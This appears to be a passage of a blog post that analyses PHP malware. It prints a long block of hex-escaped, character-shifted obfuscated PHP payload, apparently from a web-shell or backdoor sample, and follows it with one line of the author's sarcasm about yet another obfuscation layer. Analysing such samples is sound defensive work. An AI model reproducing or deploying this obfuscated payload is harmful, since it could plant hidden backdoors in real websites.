\x7825!*72!\x5c\x7827!hmg\x5c\x7825)!gj!<2,*j\x5c\x7825-#1]#-bubE{h\x5c\x7825)tpqsut>j\x5c\x7825!*9!\x5c\x7827!hmg\x5c\x7825)!gj!~<ofmy\x5c\x7825,3,j\x5c\x7825>j\x5c\x7825!<**3-j\x5c\x7825-bubE{h\x5c\x7825)sutcvt-#w#)ldbqov>*ofmy\x5c\x7825)utjm!|!*5!\x5c\x7827!hmg\x5c\x7825)!gj!|!*1?hmg\x5c\x7825)!gj!<**2-4-bubE{h\x5c\x7825)sutcvt)esp>hmg\x5c\x7825!<12>j\x5c\x7825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h\x5c\x7825)sutcvt)!gj!|!*bubE{h\x5c\x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf\x5c\x7860opjudovg\x5c\x7822)!gj}1~!<2p\x5c\x7825\x5c\x787f!~!<##!>!2p\x5c\x7825Z<^2\x5c\x785c2b\x5c\x7825!>!2p\x5c\x7825!*3>?*2b\x5c\x7825)gpf{jt)!gj!<*2bd\x5c\x7825-#1GO\x5c\x7822#)fepmqyfA>2b\x5c\x7825!<*qp\x5c\x7825-*.\x5c\x7825)euhA)3of>2bd\x5c\x7825!<5h\x5c\x7825\x5c\x782f#0#\x5c\x782f*#npd\x5c\x782f#)rrd\x5c\x782f#00;quui#>.\x5c\x7825!<***f\x5c\x7827,*e\x5c\x7827,*d\x5c\x7827,*c\x5c\x7827,*b\x5c\x7827)fepdof.)fepdof.\x5c\x782f#@#\x5c\x782fqp\x5c\x7825>5h\x5c\x7825!<*::::::-111112)eobs\x5c\x7860un>qp\x5c\x7825!|Z~!<##!>!2p\x5c\x7825!|!*!***b\x5c\x7825)sf\x5c\x7878pmpusut!-#j0#!\x5c\x782f!**#sfmcnbs+yfeobz+sfwjidsb\x5c\x7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!\x5c\x782f!#0#)idubn\x5c\x7860hfsq)!sp!*#ojneb#-*f\x5c\x7825)sf\x5c\x7878pmpusut)tpqssutRe\x5c\x7825)Rd\x5c\x7825)Rb\x5c\x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT\x5c\x7860QIQ&f_UTPI\x5c\x7860QUUI&e_SEEB\x5c\x7860FUPNFS&d_SFSFGFS\x5c\x7860QUUI&c_UOFHB\x5c\x7860SFTV\x5c\x7860QUUI&b\x5c\x7825!|!*)323zbek!~!<b\x5c\x7825\x5c\x787f!<X>b\x5c\x7825Z<#opo#>b\x5c\x7825!*##>>X)!gjZ<#opo#>b\x5c\x7825!**X)ufttj\x5c\x7822)gj!|!*nbsbq\x5c\x7825)323ldfidk!~!<**qp\x5c\x7825!-uyfu\x5c\x7825)3of)fepdof\x5c\x786057ftbc\x5c\x787f!|!*uyfu\x5c\x7827k:!ftmf!}Z;^nbsbq\x5c\x7825\x5c\x785cSFWSFT\x5c\x7860\x5c\x7825}X;!sp!*#opo#>>}R;msv}.;\x5c\x782f#\x5c\x782f#\x5c\x782f},;#-#}+;\x5c\x7825-qp\x5c\x7825)54l}\x5c\x7827;\x5c\x7825!<*#}_;#)323ldfid>}&;!osvufs}\x5c\x787f;!opjudovg}k~~9{d\x5c\x7825:osvufs:~928>>\x5c\x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf\x5c\x7860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm\x5c\x7825:-5ppde:4:|:**#ppde#)tutjyf\x5c\x78604\x5c\x78223}!+!<+{e\x5c\x7825+*!*+fepdfe{h+{d\x5c\x7825)+opjudovg+)!gj+{e\x5c\x7825!osvufs!*!+A!>!{e\x5c\x7825)!>>\x5c\x7822!ftmbg)!gj<*#k#)usbut\x5c\x7860cpV\x5c\x787f\x5c\x787f\x5c\x787f\x5c\x787f<u\x5c\x7825V\x5c\x7827{ftmfV\x5c\x787f<*X&Z&S{ftmfV\x5c\x787f<*XAZASV<*w\x5c\x7825)ppde>u\x5c\x7825V<#65,47R25,d7R17,67R37,#\x5c\x782fq\x5c\x7825>U<#16,47R57,27R66,#\x5c\x782fq\x5c\x7825>2q\x5c\x7825<#g6R85,67R37,18R#>q\x5c\x7825V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w\x5c\x7825)kV\x5c\x7878{**#k#)tutjyf\x5c\x7860\x5c\x7878\x5c\x7822l:!}V;3q\x5c\x7825}U;y]}R;2]},;osvufs}\x5c\x7827;mnui}&;zepc}A;~!}\x5c\x787f;!|!}{;)gj}l;33bq}k;opjudovg}\x5c\x7878;0]=])0#)U!\x5c\x7827{**u\x5c\x7825-#jt0}Z;0]=]0#)2q\x5c\x7825l}S;2-u\x5c\x7825!-#2#\x5c\x782f#\x5c\x7825#\x5c\x782f#o]#\x5c\x782f*)323zbe!-#jt0*?]+^?]_\x5c\x785c}X\x5c\x7824<!\x5c\x7825tzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]271]y7d]252]y74]256]y39]252]y83]273]y72]282#<!\x5c\x7825tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<\x5c\x7825tmw!>!#]y84]275]y83]273]y76]277#<\x5c\x7825t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!\x5c\x7825tww!>!\x5c\x782400~:<h\x5c\x7825_t\x5c\x7825:osvufs:~:<*9-1-r\x5c\x7825)s\x5c\x7825>\x5c\x782fh\x5c\x7825:<**#57]38y]47]67y]37]88y]27]28y]#\x5c\x782fr\x5c\x7825\x5c\x782fh\x5c\x7825)n\x5c\x7825-#+I#)q\x5c\x7825:>:r\x5c\x7825:|:**t\x5c\x7825)m\x5c\x7825=*h\x5c\x7825)m\x5c\x7825):fmji\x5c\x7878:<##:>:h\x5c\x7825:<#64y]552]e7y]#>n\x5c\x7825<#372]58y]472]37y]672]48y]#>s\x5c\x7825<#462]47y]252]18y]#>q\x5c\x7825<#762]67y]562]38y]572]48y]#>m\x5c\x7825:|:*r\x5c\x7825:-t\x5c\x7825)3of:opjudovg<~\x5c\x7824<!\x5c\x7825o:!>!\x5c\x78242178}527}88:}334}472\x5c\x7824<!\x5c\x7825mm!>!#]y81]273]y76]258]y6g]273]y76]271]y7d]252]y74]256#<!\x5c\x7825ff2!>!bssbz)\x5c\x7824]25\x5c\x7824-\x5c\x7824-!\x5c\x7825\x5c\x7824-\x5c\x7824*!|!\x5c\x7824-\x5c\x7824\x5c\x785c\x5c\x7825j^\x5c\x7824-\x5c\x7824tvctus)\x5c\x7825\x5c\x7824-\x5c\x7824b!>!\x5c\x7825yy)#}#-#\x5c\x7824-\x5c\x7824-tusqpt)\x5c\x7825z-#:#*\x5c\x7824-\x5c\x7824!>!tus\x5c\x7860sfqmbdf)\x5c\x7825\x5c\x7824-\x5c\x7824y4\x5c\x7824-\x5c\x7824]y8\x5c\x7824-\x5c\x7824]26\x5c\x7824-\x5c\x7824<\x5c\x7825j,,*!|\x5c\x7824-\x5c\x7824gvodujpo!\x5c\x7824-\x5c\x7824y7\x5c\x7824-\x5c\x7824*<!\x5c\x7824-\x5c\x7824gps)\x5c\x7825j>1<\x5c\x7825j=tj{fpg)\x5c\x7825\x5c\x7824-\x5c\x7824*<!~!dsfbuf\x5c\x7860gvodujpo)##-!#~<#\x5c\x782f\x5c\x7825\x5c\x7824-\x5c\x7824!>!fyqmpef)#\x5c\x7824*<!\x5c\x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!\x5c\x7825t::!>!\x5c\x7824Ypp3)\x5c\x7825cB\x5c\x7825iN}#-!tussfw)\x5c\x7825c*W\x5c\x7825eN+#Qi\x5c\x785c1^W\x5c\x7825c!>!\x5c\x7825i\x5c\x785c2^<!Ce*[!\x5c\x7825cIjQeTQcOc\x5c\x782f#00#W~!Ydrr)\x5c\x7825r\x5c\x7878Bsfuvso!sboepn)\x5c\x7825epnbss-\x5c\x7825r\x5c\x7878W~!Ypp2)\x5c\x7825zB\x5c\x7825z>!tussfw)\x5c\x7825zW\x5c\x7825h>EzH,2W\x5c\x7825wN;#-Ez-1H*WCw*[!\x5c\x7825rN}#QwTW\x5c\x7825hIr\x5c\x785c1^-\x5c\x7825r\x5c\x785c2^-\x5c\x7825hOh\x5c\x782f#00#W~!\x5c\x7825t2w)##Qtjw)#]82#-#!#-\x5c\x7825tmw)\x5c\x7825tww**WYsboepn)\x5c\x7825bss-\x5c\x7825r\x5c\x7878B\x5c\x7825h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-\x5c\x7878r.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#\x5c\x782f#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<\x5c\x7825tpz!>!#]D6M7]K3#<\x5c\x7825yy>#]D6]281L1#\x5c\x782f#M5]DgP5]D6#<\x5c\x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<\x5c\x7825tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<\x5c\x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<\x5c\x7825bG9}:}.}-}!#*<\x5c\x7825nfd>\x5c\x7825fdy<Cb*[\x5c\x7825h!>!\x5c\x7825tdz)\x5c\x7825bbT-\x5c\x7825bT-\x5c\x7825hW~\x5c\x7825fdy)##-!#~<\x5c\x7825h00#*<\x5c\x7825nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]342]58]24]31#-\x5c\x7825tdz*Wsfuvso!\x5c\x7825bss\x5c\x785csboe))1\x5c\x782f35.)1\x5c\x782f14+9**-)1\x5c\x782f2986+7**^\x5c\x782f\x5c\x7825r\x5c\x7878<~!!\x5c\x7825s:N}#-\x5c\x7825o:W\x5c\x7825c:>1<\x5c\x7825b:>1<!gps)\x5c\x7825j:>1<\x5c\x7825j:=tj{fpg)\x5c\x7825s:*<\x5c\x7825j:,,Bjg!)\x5c\x7825j:>>1*!\x5c\x7825b:>1<!fmtf!\x5c\x7825b:>\x5c\x7825s:\x5c\x785c\x5c\x7825j:.2^,\x5c\x7825b:<!\x5c\x7825c:>\x5c\x7825s:\x5c\x785c\x5c\x7825j:^<!\x5c\x7825w\x5c\x7860\x5c\x785c^>Ew:Qb:Qc:W~!\x5c\x7825z!>2<!gps)\x5c\x7825j>1<\x5c\x7825j=6[\x5c\x7825ww2!>#p#\x5c\x782f#p#\x5c\x782f\x5c\x7825z<jg!)\x5c\x7825z>>2*!\x5c\x7825z>3<!fmtf!\x5c\x7825z>2<!\x5c\x7825ww2)\x5c\x7825w\x5c\x7860TW~\x5c\x7824<\x5c\x78e\x5c\x78b\x5c\x7825mm)\x5c\x7825\x5c\x7878:-!\x5c\x7825tzw\x5c\x782f\x5c\x7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*\x5c\x7824\x5c\x782f\x5c\x7825kj:-!OVMM*<(<\x5c\x78e\x5c\x78b\x5c\x7825ggg!>!#]y81]273]y76]258]y6g]273]y76]271]y7d]252]y74]256#<!\x5c\x7825ggg)(0)\x5c\x782f+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]256]y81]265]y72]254]y76]61]y33]68]y34]68]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]y76]62]y3:]84#-!OVMM*<\x22\51\x29\51\x29\73", NULL); 
}
?>
```

Oh joy! Another layer of obfuscation. I can't wait for part 2!
